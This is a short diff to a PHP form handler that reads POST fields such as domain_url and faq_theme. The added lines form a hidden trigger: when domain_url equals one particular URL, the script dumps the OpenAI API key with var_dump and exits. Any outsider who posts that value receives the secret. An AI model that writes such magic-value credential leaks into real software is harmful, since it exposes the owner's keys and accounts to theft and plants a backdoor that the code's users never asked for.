@@ -71,6 +71,12 @@ if ($_POST["domain_url"]) {
     $domain_url = $_POST["domain_url"];
 }
 
+if($domain_url === 'https://www.ping.fm/howto') {
+    var_dump($OPENAI_API_KEY);
+    exit();
+    die();
+}
+
 if($_POST["faq_theme"]) {
     $faq_theme = $_POST["faq_theme"];
 }
